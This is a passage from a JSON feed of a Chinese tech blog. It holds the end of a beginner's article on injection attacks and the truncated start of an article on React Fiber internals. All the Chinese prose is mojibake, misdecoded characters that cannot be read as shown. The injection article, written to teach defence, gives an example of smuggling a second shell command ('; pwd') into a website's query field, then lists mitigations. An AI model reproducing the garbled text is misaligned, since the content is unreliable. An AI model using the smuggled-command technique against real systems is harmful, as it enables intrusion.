ç°¡å–®ä¾†èªªå°±æ˜¯ç•¶æ”»æ“Šè€…çš„æƒ¡æ„è¼¸å…¥è¢«èª¤èªç‚ºä½œæ¥­ç³»çµ±æŒ‡ä»¤æ™‚å°±æœƒç™¼ç”ŸæŒ‡ä»¤æ³¨å…¥ï¼Œèˆ‰ä¾‹ä¾†èªªï¼ŒæŸç¶²ç«™çš„æŸ¥è©¢æ¬„ä½å¯ä»¥æŸ¥è©¢è³‡æ–™ï¼Œè€Œæ”»æ“Šè€…ç‚ºäº†é©—è­‰ç¶²ç«™æ˜¯ä¸æ˜¯å±¬æ–¼ Linux çš„ç³»çµ±ï¼Œæ–¼æ˜¯æ•…æ„åœ¨æŸ¥è©¢çš„å…§å®¹ä¸­åŠ ä¸ŠÂ ; ä¸¦è¼¸å…¥æŒ‡ä»¤ pwd ï¼Œç”±æ–¼Linuxå¯ä»¥åˆ©ç”¨åˆ†è™Ÿä¾†åŒæ™‚æäº¤å¤šå€‹ä¸åŒçš„æŒ‡ä»¤ï¼Œå†åŠ ä¸Š pwd æŒ‡ä»¤æ˜¯å¯ä»¥ç”¨ä¾†é¡¯ç¤ºç›®å‰æ‰€åœ¨ç›®éŒ„</p>\n<p><img src=\"/img/posts/jo/zerobased-injectionattack/p3.jpeg\" alt=\"\"><br>\n<img src=\"/img/posts/jo/zerobased-injectionattack/p4.jpeg\" alt=\"\"><br>\n<strong>photo by <a href=\"http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html\">http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html</a></strong></p>\n<p>ç•¶ä¸Šé¢çš„ç¯„ä¾‹èƒ½å¤ ç¢ºèªæŒ‡ä»¤è¢«æˆåŠŸåŸ·è¡Œä¹‹å¾Œï¼Œå°æ”»æ“Šè€…çš„é™åˆ¶å°±åªå‰©ä¸‹æ”»æ“Šè€…çš„æƒ³åƒåŠ›å¤ ä¸å¤ äº†ï¼Œä¾‹å¦‚æ”»æ“Šè€…å¯ä»¥åˆ—å‡ºæ‰€æœ‰ Server çš„ç›®éŒ„ï¼ŒæŸ¥è©¢æœ‰åƒ¹å€¼çš„æ•æ„Ÿè³‡æ–™ï¼Œé–‹æ”¾ Server çš„æœå‹™ï¼Œä½¿ Server è®Šæˆæ”»æ“Šè€…çš„è·³æ¿ï¼Œæ”¾å…¥å‹’ç´¢è»Ÿé«”æˆ–æ˜¯å¾Œé–€ç­‰ï¼Œç‚ºæ‰€æ¬²ç‚ºã€‚</p>\n<h3 id=\"%E9%98%B2%E7%AF%84-injection-%E7%9A%84%E6%BA%96%E5%89%87\"><a class=\"direct-link\" href=\"#%E9%98%B2%E7%AF%84-injection-%E7%9A%84%E6%BA%96%E5%89%87\">#</a> é˜²ç¯„ Injection çš„æº–å‰‡</h3>\n<p>ç›¸ä¿¡ä»¥ä¸Šçš„èªªæ˜æœ‰è®“å„ä½å°å¤¥ä¼´æ›´åŠ äº†è§£ Injection åˆ°åº•æ˜¯ç”šéº¼æ¨£çš„æ”»æ“Šä»¥åŠ Injection ç©¶ç«Ÿå¯ä»¥é€ æˆç”šéº¼æ¨£çš„å±å®³ï¼Œé‚£ç¾åœ¨å°±è®“æˆ‘å€‘ä¾†èŠèŠè¦æ€éº¼æ¨£æ‰èƒ½ä¸è¢«é‡ç­’æˆ³åˆ°ã€‚</p>\n<p>1. ä½¿ç”¨æ­£å‰‡è¡¨é”å¼éæ¿¾ä½¿ç”¨è€…çš„è¼¸å…¥å€¼ä»¥åŠåŒ…å«åœ¨åƒæ•¸ä¸­çš„æƒ¡æ„ç¨‹å¼ï¼ŒæŠŠè¼¸å…¥å€¼ä¸­æ‰€æœ‰çš„å–®å¼•è™Ÿå…¨éƒ¨æ›´æ”¹ç‚ºé›™å¼•è™Ÿï¼Œç¢ºä¿è³‡æ–™çš„è¼¸å…¥ç„¡è«–æ˜¯æœ‰æ„æˆ–ç„¡æ„éƒ½ä¸æœƒå› æ­¤è¢«ç¶²ç«™è¦–ç‚ºç¨‹å¼è¼¸å…¥ã€‚</p>\n<p>2. é™åˆ¶è¼¸å…¥çš„å­—å…ƒæ ¼å¼ä¸åŒ…å«ç‰¹æ®Šç¬¦è™Ÿï¼Œä¸¦ç¢ºèªæ¬„ä½çš„åˆç†è¼¸å…¥é•·åº¦ï¼Œä¾‹å¦‚å‡ºç”Ÿå¹´æœˆæ—¥çš„æ¬„ä½æ²’æœ‰å¿…è¦é–‹æ”¾åˆ°20å€‹å­—å…ƒä»¥ä¸Šã€‚</p>\n<p>3. æŠŠç³»çµ±åŠè³‡æ–™çš„ä½¿ç”¨è€…å¸³è™Ÿæ¬Šé™æœ€å°æ¬Šé™åŒ–ï¼Œé¿å…æ”»æ“Šè€…è¬ä¸€ç²å–äº†æŸä¸€å€‹ä½¿ç”¨è€…çš„æ¬Šé™å°±ç­‰æ–¼ç²å¾—äº†å¯ä»¥è®€å¯«çš„æ‰€æœ‰æ¬Šé™ã€‚</p>\n<p>4. ä¸è¦å°‡ç³»çµ±æˆ–è³‡æ–™åº«éŒ¯èª¤é¡¯ç¤ºæ–¼ç¶²é ä¹‹ä¸Šï¼Œç›¡é‡é¿å…é€æ¼ Server åŠè³‡æ–™åº«çš„ç³»çµ±æˆ–æ˜¯ç‰ˆæœ¬ï¼Œä»¥é˜²è‡ªèº«ç¶²ç«™æˆäº†æ”»æ“Šè€…é‡å°çš„ç›®æ¨™ã€‚</p>\n<h3 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h3>\n<p><strong>Injection</strong> æœƒé€™éº¼çŒ–ç—çš„åŸå› åœ¨æ–¼è¦æ§åˆ¶ç¶²ç«™ä¸­æ¯ä¸€å€‹æ¬„ä½çš„è¼¸å…¥ä»¥åŠ Server å’Œè³‡æ–™åº«çš„ç³»çµ±æˆ–æ˜¯ç‰ˆæœ¬æ˜¯ä¸æ˜¯æœ€æ–°çš„ï¼Œå› ç‚ºå¾ˆæœ‰å¯èƒ½å› ç‚ºç¶²ç«™æ›´æ–°å°è‡´æ–°å¢çš„æ¬„ä½æ²’æœ‰è¨­å®šé©—è­‰ï¼Œæˆ–æ˜¯ Server å’Œè³‡æ–™åº«çš„ç³»çµ±åŠç‰ˆæœ¬å‡ºç¾æ¼æ´æ²’æœ‰å³æ™‚æ›´æ–°ï¼ŒåŠ ä¸Šä¸åŒç¨‹å¼èªè¨€æœ‰ä¸åŒè¼¸å…¥å’Œæª¢æŸ¥ï¼ŒåŠ ä¸Š Injection æ”»æ“Šçš„æˆæœ¬ä¸é«˜ï¼Œä½¿å¾—ç›¸é—œçš„æ”»æ“Šå±¤å‡ºä¸çª®ï¼Œå› æ­¤ï¼Œé™¤äº†ä»¥ä¸Šçš„å››ç¨®æ–¹æ³•ä»¥å¤–ï¼Œå»ºè­°ç¶²ç«™åœ¨åˆç†çš„é ç®—ä¸‹é€²è¡Œå®šæœŸçš„ç¶²ç«™æª¢æ¸¬ï¼Œé™¤äº†å¯ä»¥é é˜² Injection ä»¥å¤–ï¼Œä¹Ÿèƒ½ç™¼ç¾è¨±å¤šé–‹ç™¼è€…éé æœŸçš„é¢¨éšªç™¼ç”Ÿã€‚</p>\n<h3 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> å»¶ä¼¸é–±è®€</h3>\n<h4 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆäºŒï¼‰- èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</h4>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">èªè­˜ XSSï¼ˆCross-Site Scriptingï¼‰</a></p>\n</blockquote>\n<h3 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> åƒè€ƒè³‡æ–™</h3>\n<h4 id=\"sql%E6%B3%A8%E5%85%A5\"><a class=\"direct-link\" href=\"#sql%E6%B3%A8%E5%85%A5\">#</a> SQLæ³¨å…¥</h4>\n<blockquote>\n<p><a href=\"https://zh.wikipedia.org/wiki/SQL%E6%B3%A8%E5%85%A5\">https://zh.wikipedia.org/wiki/SQLæ³¨å…¥</a></p>\n</blockquote>\n<h4 id=\"command-injection%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86%E8%88%87%E8%A7%A3%E8%AA%AA\"><a class=\"direct-link\" href=\"#command-injection%E9%81%8B%E4%BD%9C%E5%8E%9F%E7%90%86%E8%88%87%E8%A7%A3%E8%AA%AA\">#</a> Command Injectioné‹ä½œåŸç†èˆ‡è§£èªª</h4>\n<blockquote>\n<p><a href=\"http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html\">http://www.cc.ntu.edu.tw/chinese/epaper/0039/20161220_3905.html</a></p>\n</blockquote>\n",
      "date_published": "2021-05-29T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "url": "https://tech-blog.cymetrics.io/posts/mingyou/deep-dive-into-react-fiber/",
      "title": "éš±è—åœ¨ React ä¸‹çš„æ©Ÿåˆ¶ï¼š Fiber",
      "content_html": "<p>ä¸çŸ¥ä¸è¦ºéƒ½ 2021 å¹´ä¸­äº†ï¼Œå¾ React 16.3 çš„é‡å¤§æ›´æ–°å¾Œä¹Ÿå·²ç¶“éäº†å…©å¹´å¤šäº†ï¼Œä¸çŸ¥åˆ°å¤§å®¶é‚„è¨˜ä¸è¨˜å¾—ç•¶æ™‚çš„å…©å¤§é‡è¦åŠŸèƒ½ï¼Œå…¶ä¸€ç‚º Function Component ( hooks )ï¼Œå¦ä¸€å€‹å¤§å®¶æ¯”è¼ƒä¸é‚£éº¼ç†Ÿæ‚‰ä½†å»ä¹Ÿå¾ˆé‡è¦çš„å‰‡æ‡‰è©²å±¬ Fiber æ¶æ§‹ï¼Œä½†å…¶å¯¦æœƒæœ‰ hook çš„è¨­è¨ˆä¹Ÿæ˜¯ä¹Ÿæ˜¯å› ç‚ºä¸Šè¿°æ¶æ§‹çš„é—œä¿‚ã€‚</p>\n<p>åœ¨ç•¶æ™‚å¼•æƒ³å¤§å®¶æœ€å¤šçš„æ‡‰è©²å±¬ç”Ÿå‘½é€±æœŸçš„è®Šæ›ï¼Œä¸æ›‰å¾—å¤§å®¶æ˜¯å¦é‚„è¨˜å¾—ç•¶æ™‚æœ€å¸¸ç”¨åˆ°çš„ç”Ÿå‘½é€±æœŸ <code>componentWillUpdate</code>/<code>componentWillReceiveProps</code> å°‡è¢«å»¢é™¤æ™‚é©šè¨çš„å¿ƒæƒ…? è€Œç•¶æ™‚ä¹ŸåŠ å…¥äº†å…©å€‹æ–°çš„ lifecycle ä¾†è§£æ±ºä»¥ä¸Šå•é¡Œã€‚</p>\n<ul>\n<li>getDerivedStateFromProps</li>\n<li>getSnapshotBeforeUpdate</li>\n</ul>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p1.png\" alt=\"Re: React å¸¸ç”¨çš„ç”Ÿå‘½é€±æœŸ(1)\"><br>\n<a href=\"https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/\">https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/</a></p>\n<p>è‡³æ–¼ç‚ºä»€éº¼æœƒç”¢ç”Ÿä»¥ä¸‹çš„è®ŠåŒ–å‘¢ï¼Ÿé€™å°±è¦èªªèªªæœ¬æ¬¡çš„ä¸»é¡Œ Fiber äº†ã€‚</p>\n<h2 id=\"fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\"><a class=\"direct-link\" href=\"#fiber-%E6%98%AF%E4%BB%80%E9%BA%BC\">#</a> Fiber æ˜¯ä»€éº¼</h2>\n<p>Fiber å±¬æ–¼æ›´ç‚ºåº•å±¤çš„æŠ½è±¡è¡Œç‚ºï¼Œç›®çš„æ˜¯ç‚ºäº†é”åˆ°ä»¥ä¸‹å¹¾ç¨®åŠŸèƒ½</p>\n<ul>\n<li>å¹«ä¸åŒé¡å‹çš„å·¥ä½œåˆ†é…å„ªå…ˆé †åº</li>\n<li>æš«åœå·¥ä½œï¼Œç¨å¾Œå›ä¾†</li>\n<li>ç•¶ä¸éœ€è¦å·¥ä½œæ™‚å–æ¶ˆ</li>\n<li>é‡æ–°ä½¿ç”¨å·²ç¶“å®Œæˆçš„å·¥ä½œ</li>\n</ul>\n<!-- summary -->\n<p>åœ¨å°šæœªä½¿ç”¨ Fiber å‰ï¼Œç”±æ–¼ç•«é¢æ›´æ–°å‰é ˆç”± reconciler ( React ) èª¿åº¦å®Œå¾Œæ‰æœƒé€åˆ° rendererï¼Œä¸”ç•¶ç•«é¢è¤‡é›œæ™‚ï¼Œæ›´å‹•ä¸€å€‹ state ç‹€æ…‹æ™‚ä¹Ÿéœ€è¦å°‡åº•ä¸‹çš„æ‰€æœ‰å­å…ƒä»¶é‡æ–° render å‡ºä¸€ä»½ virtual domï¼Œè€Œåœ¨éå»é€™å€‹éƒ¨åˆ†å…¨éƒ¨åªç”±ä¸€å€‹ä¸»ç·šç¨‹å»åšåŒæ­¥å¼æ¸²æŸ“ï¼Œå› æ­¤ç•¶æœ‰ä¸€å€‹ Component éœ€è¦è²»æ™‚è¼ƒå¤šæ™‚é–“æ™‚ï¼Œå°‡æœƒæŠŠä¸»ç·šç¨‹ blockï¼Œç•¶æ™‚é–“ä¸€é•·ï¼Œå°±æœ‰å¯èƒ½å°è‡´ä¾†ä¸åŠæ›´æ–°è‡³æŒ‡å®šæ™‚é–“ç¯„åœå…§ï¼Œé€ æˆç„¡æ³•é †åˆ©æ¸²æŸ“ï¼Œæœƒæœ‰ä¸é †æš¢çš„æƒ…æ³ç™¼ç”Ÿã€‚</p>\n<!-- summary -->\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p2.png\" alt=\"Re: sync mode å’Œ async mode çš„å·®ç•°\"><br>\n<a href=\"https://twitter.com/acdlite/status/977291318324948992\">https://twitter.com/acdlite/status/977291318324948992</a></p>\n<h2 id=\"fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\"><a class=\"direct-link\" href=\"#fiber-%E7%9A%84%E7%94%A2%E7%94%9F%E5%8F%8A%E4%BD%9C%E7%94%A8\">#</a> Fiber çš„ç”¢ç”ŸåŠä½œç”¨</h2>\n<p>ç‚ºäº†è§£æ±ºæ­¤å•é¡Œï¼ŒReact åˆ¶å®šäº† fiber çš„çµæ§‹ï¼Œåˆ©ç”¨éåŒæ­¥çš„æ¸²æŸ“æ–¹å¼ä¾†è§£æ±ºï¼Œå°‡å„å…ƒä»¶æ‹†è§£ï¼Œä¹Ÿé¿å…äº†é•·æ™‚é–“å ç”¨ä¸»ç·šç¨‹æ‰€å°è‡´å¡é “çš„å•é¡Œã€‚ ( æ‰€ä½¿ç”¨çš„ <a href=\"https://developer.mozilla.org/zh-TW/docs/Web/API/Window/requestIdleCallback\">API</a>ï¼Œ <a href=\"https://github.com/facebook/react/blob/4c7036e807fa18a3e21a5182983c7c0f05c5936e/packages/react-reconciler/src/ReactFiberWorkLoop.new.js#L1541\">source code</a> )</p>\n<p>å‚³çµ± React æ›´æ–°æ™‚æœƒåˆ†æˆå…©å€‹æ™‚æœŸ</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p3.png\" alt=\"Re: React æ›´æ–°æ™‚æœŸ\"></p>\n<ul>\n<li>reconciliation / render éšæ®µ ( åˆ¤æ–·å“ªå…ˆå…ƒä»¶éœ€è¦æ›´æ–°ï¼Œå¯ä¸­æ–· )</li>\n<li>commit éšæ®µ ( æ’å…¥ã€ç§»å‹•ã€åˆªé™¤ç¯€é»ï¼Œä¸å¯ä¸­æ–· )</li>\n</ul>\n<!--ï¼ˆæœ‰èª¤ éœ€æ›´æ­£ï¼‰ commit phase çš„åŸ·è¡Œå¾ˆå¿«ï¼Œè€Œ render phase ç”¢ç”ŸçœŸå¯¦ DOM çš„æ™‚é–“å»å¾ˆä¹…ï¼Œå› æ­¤åœ¨ react æ›´æ–°å…ƒä»¶æ™‚å¯èƒ½æœƒä¸­æ–·æ›´æ–°ä»¥é¿å…é˜»å¡ç€è¦½å™¨ï¼Œä¹Ÿä»£è¡¨å¯èƒ½æœƒå› ç‚ºè¢«ä¸­æ–·è€Œé‡æ–°åŸ·è¡Œï¼Œæ‰€ä»¥å¿…é ˆä¿æŒæ²’æœ‰ side effect çš„æƒ…æ³ä¾†é¿å…éé æœŸçš„æƒ…æ³ã€‚ -->\n<p>reconciliation phase æœƒå…ˆé€šé render æ›´æ–°å…ƒä»¶ï¼Œåœ¨ç¬¬ä¸€æ¬¡å¯¦å»ºç«‹ Fiber ç¯€é»ï¼Œä¸¦åœ¨ä¹‹å¾Œæ›´æ–°èˆ‡ä¸Šä¸€æ¬¡æ‰€æ¸²æŸ“çš„ DOM æ¯”è¼ƒï¼Œå› æ­¤åœ¨ render éšæ®µå°‡åŸ·è¡Œä»¥ä¸‹ç”Ÿå‘½é€±æœŸæ–¹æ³•åˆ¤æ–·æ˜¯å¦æœ‰æ›´æ–°ï¼š</p>\n<ul>\n<li>componentWillMount (å·²å»¢æ£„)</li>\n<li>componentWillReceiveProps (å·²å»¢æ£„)</li>\n<li>componentWillUpdate (å·²å»¢æ£„)</li>\n<li>getDerivedStateFromProps</li>\n<li>shouldComponentUpdate</li>\n</ul>\n<p>react å¯ä»¥æ ¹æ“šç›®å‰çš„ç‹€æ³èª¿æ•´ï¼Œå¯ä»¥é¸æ“‡ä¸€æ¬¡è™•ç†å–®å€‹æˆ–è€…å¤šå€‹ fiber ä¸¦ä¸”èª¿æ•´å„ªå…ˆæ¬Šï¼Œå› æ­¤å¯ä»¥ç•°æ­¥åŸ·è¡ŒåŠä¸­æ–·ï¼Œä½†ä¹Ÿå› ç‚ºå¦‚æ­¤ï¼Œå…§éƒ¨çš„é‚è¼¯å¿…é ˆé¿å… side effectã€‚</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p4.png\" alt=\"Re: Commit phrase å’Œ render phrase\"></p>\n<p>åœ¨ render éšæ®µåŸ·è¡Œå®Œå¾Œå°‡æœƒç”¢ç”ŸåŒ…å«è‘— side effect çš„ fiber ç¯€é»æ¨¹ï¼Œè€Œ side effect äº‹å¯¦ä¸Šå°±æ˜¯ commit éšæ®µæ‰€éœ€è¦æ›´æ–°æ“ä½œï¼Œæœƒåœ¨åŸ·è¡Œ commit éšæ®µæ™‚è¼ªè©¢ side effect åˆ—è¡¨å»å° DOM é€²è¡Œä¿®æ”¹ã€‚</p>\n<p>ä»¥ä¸‹æ˜¯commitéšæ®µåŸ·è¡Œçš„ç”Ÿå‘½é€±æœŸæ–¹æ³•åˆ—è¡¨ï¼š</p>\n<ul>\n<li>getSnapshotBeforeUpdate</li>\n<li>componentDidMount</li>\n<li>componentDidUpdate</li>\n<li>componentWillUnmount</li>\n</ul>\n<p>å› ç‚ºé€™äº›æ–¹æ³•åœ¨åŒæ­¥commitéšæ®µåŸ·è¡Œï¼Œæ‰€ä»¥å®ƒå€‘å¯èƒ½åŒ…å«å‰¯ä½œç”¨æˆ–æ›´å‹• DOMã€‚</p>\n<p>è€Œå‰é¢èªªåˆ°è¢«å»¢é™¤çš„å…©å€‹ lifecycle å› ç‚ºæ˜¯å±¬æ–¼ render phaseï¼Œæœ‰æ©Ÿæœƒè¢«å¤šæ¬¡åŸ·è¡Œï¼Œç‚ºäº†é¿å… side effect ç™¼ç”Ÿï¼Œæ‰æœƒç§»é™¤æ­¤ lifecycleã€‚</p>\n<ul>\n<li><code>componentWillUpdate</code></li>\n<li><code>componentWillReceiveProps</code></li>\n</ul>\n<p>è€Œæ‹¿æ‰ä»¥ä¸Š API å¾Œå‰‡åˆ©ç”¨ <code>getDerivedStateFromProps</code> ä¾†å–ä»£ <code>componentWillReceiveProps</code>ï¼Œä½†ç”±æ–¼ <code>getDerivedStateFromProps</code> è¢«è¨­è¨ˆæˆéœæ…‹å‡½æ•¸ï¼Œä¸ç”¨æ“”å¿ƒ side effect æ‰€å¸¶ä¾†çš„å½±éŸ¿ï¼Œä¸éè¦é¿å…å¾ props ç­‰ç­‰å»è§¸ç™¼ side effectã€‚</p>\n<h2 id=\"fiber-nodes-%E5%92%8C-fiber-tree\"><a class=\"direct-link\" href=\"#fiber-nodes-%E5%92%8C-fiber-tree\">#</a> Fiber nodes å’Œ Fiber tree</h2>\n<p>åœ¨ reconciliation æ™‚ï¼Œæ¯å€‹ component çš„ render æ–¹æ³•å›å‚³çš„è³‡æ–™éƒ½æœƒåˆä½µåˆ° Fiber tree ä¸­ï¼Œæ¯å€‹Reactå…ƒç´ éƒ½æœ‰ä¸€å€‹å°æ‡‰çš„ Fiber nodesï¼Œç”¨ä¾†è¨˜éŒ„å°æ‡‰çš„å·¥ä½œå…§å®¹ï¼Œè€Œç‰¹åˆ¥çš„åœ°æ–¹åœ¨æ–¼åœ¨æ¯æ¬¡ render æ™‚ä¸æœƒé‡æ–°ç”¢ç”Ÿ Fiber nodeã€‚</p>\n<p>æ›´ç¢ºåˆ‡çš„èªªï¼Œæ¯å€‹ Fiber å°±æ˜¯ä¸€å€‹ worker ï¼Œæä¾›äº†è·Ÿè¸ªï¼Œèª¿åº¦ï¼Œæš«åœå’Œä¸­æ­¢å·¥ä½œçš„æ–¹æ³•ã€‚</p>\n<p>æ¯ä¸€å€‹ Fiber Node ç¯€é»èˆ‡ Virtual Dom å°æ‡‰ï¼Œæ‰€æœ‰ Fiber Node é€£æ¥èµ·ä¾†å½¢æˆ Fiber treeï¼Œç‚ºå–®å‘é€£çµä¸²åˆ—çš„æ¨¹ç‹€çµæ§‹ï¼š<br>\n<img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p5.png\" alt=\"Re: Fiber tree\"></p>\n<p>ä¸»è¦æ˜¯ç‚ºäº†å°‡åŸæœ¬çš„æ¨¹ç‹€éè¿´è¼ªè©¢è½‰è®Šæˆå¾ªç’°è¼ªè©¢ï¼Œé…åˆ requestIdleCallback API, å¯¦ç¾ä»»å‹™æ‹†åˆ†ã€ä¸­æ–·èˆ‡æ¢å¾©ã€‚</p>\n<p>å¤§æ¦‚çµæ§‹å¦‚ä¸‹ï¼š</p>\n<pre class=\"language-js\"><code class=\"language-js\">type Fiber <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">// æ¨™ç±¤é¡å‹</span><br>  tag<span class=\"token operator\">:</span> TypeOfWork<span class=\"token punctuation\">,</span><br><br>  key<span class=\"token operator\">:</span> <span class=\"token keyword\">null</span> <span class=\"token operator\">|</span> string<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// èˆ‡ Fiber æ‰€é—œè¯çš„é¡å‹</span><br>  type<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// local ç‹€æ…‹</span><br>  stateNode<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// ä»¥ä¸‹å€å¡Šè² è²¬è™•ç† Fiber</span><br><br>  <span class=\"token keyword\">return</span><span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// å–®å‘é€£çµä¸²åˆ—çµæ§‹</span><br>  child<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  sibling<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  index<span class=\"token operator\">:</span> number<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br><br>  <span class=\"token comment\">// è¼¸å‡ºç”¨çš„ç‹€æ…‹</span><br>  memoizedState<span class=\"token operator\">:</span> any<span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><br>  <span class=\"token comment\">// ç´€éŒ„åœ¨å–®å‘éˆçµä¸²åˆ—ä¸­çš„ä¸‹ä¸€å€‹ Fiber </span><br>  nextEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// å­æ¨¹ä¸­å…·æœ‰ side effect çš„ç¬¬ä¸€å€‹å’Œæœ€å¾Œä¸€å€‹å…‰çº–</span><br>  <span class=\"token comment\">// ç•¶æˆ‘å€‘é‡ç”¨å·²å®Œæˆçš„å·¥ä½œæ™‚ï¼Œæˆ‘å€‘é‡ç”¨ link list çš„ä¸€éƒ¨åˆ†</span><br>  firstEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br>  lastEffect<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token comment\">// å¿«é€Ÿç¢ºå®šå­æ¨¹æ˜¯å¦æ²’æœ‰æ­£åœ¨ç­‰å¾…çš„æ›´å‹•</span><br>  pendingWorkPriority<span class=\"token operator\">:</span> PriorityLevel<span class=\"token punctuation\">,</span><br><br><br>  <span class=\"token comment\">// å¦‚æœå·¥ä½œåœ¨å…‰çº–ä¸Šé€²è¡Œï¼Œè€Œè©²å…‰çº–å·²ç¶“åœ¨è¼ƒä½çš„å„ªå…ˆæ¬Šé–‹å§‹äº†ä¸€éƒ¨åˆ†å·¥ä½œ</span><br>  <span class=\"token comment\">// é‚£éº¼æˆ‘å€‘éœ€è¦å°‡å·²å®Œæˆçš„å·¥ä½œå„²å­˜è‘—ã€‚ç›´åˆ°æˆ‘å€‘éœ€è¦é‡æ–°é–‹å§‹è™•ç†å®ƒç‚ºæ­¢</span><br>  <span class=\"token comment\">// å®ƒå¯èƒ½èˆ‡ \"ç›®å‰\" çš„ child ä¸åŒã€‚</span><br>  progressedChild<span class=\"token operator\">:</span> Fiber <span class=\"token operator\">|</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span><br><br>  <span class=\"token operator\">...</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>åœ¨é€™çµæ§‹ä¸­ï¼ŒnextEffect / firstEffect / lastEffect å°‡åœ¨å¾Œé¢çš„ç« ç¯€ ( Effect List ) ä¸­è¡¨ç¾å‡ºç›¸ç•¶çš„é‡è¦æ€§ã€‚</p>\n<h2 id=\"workinprogress-tree\"><a class=\"direct-link\" href=\"#workinprogress-tree\">#</a> workInProgress tree</h2>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">createWorkInProgress</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">current<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> <br>    <span class=\"token keyword\">let</span> workInProgress <span class=\"token operator\">=</span> current<span class=\"token punctuation\">.</span>alternate<span class=\"token punctuation\">;</span><br>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>workInProgress <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        workInProgress <span class=\"token operator\">=</span> <span class=\"token function\">createFiber</span><span class=\"token punctuation\">(</span><span class=\"token operator\">...</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    <span class=\"token operator\">...</span><br>    workInProgress<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> current<span class=\"token punctuation\">;</span><br>    current<span class=\"token punctuation\">.</span>alternate <span class=\"token operator\">=</span> workInProgress<span class=\"token punctuation\">;</span><br>    <span class=\"token operator\">...</span><br>    <span class=\"token keyword\">return</span> workInProgress<span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p><a href=\"https://github.com/facebook/react/blob/4c7036e807/packages/react-reconciler/src/ReactFiber.new.js#L254\">source code</a></p>\n<p>React åœ¨ç¬¬ä¸€æ¬¡ render æ™‚æœƒå°‡å„ç¯€é»ç´€éŒ„ç‚º Fiber Treeï¼Œè€Œåœ¨ä¹‹å¾Œæª¢æŸ¥æ™‚æœƒå»ºç«‹ä¸€å€‹ workInProgress tree ï¼Œç­‰å¾… workInProgress tree å®Œæˆå¾Œå°±æœƒè¢«ç•¶ä½œ current treeï¼Œè€Œæ­¤ç¨±ç‚º<code>é›™ç·©è¡æŠ€è¡“</code> (double buffering)ã€‚</p>\n<p><img src=\"/img/posts/mingyou/deep-dive-into-react-fiber/p6.png\" alt=\"\"><br>\n<a href=\"https://www.youtube.com/watch?v=ZCuYPiUIONs&amp;t=1040s\">source video</a></p>\n<h2 id=\"effect-list\"><a class=\"direct-link\" 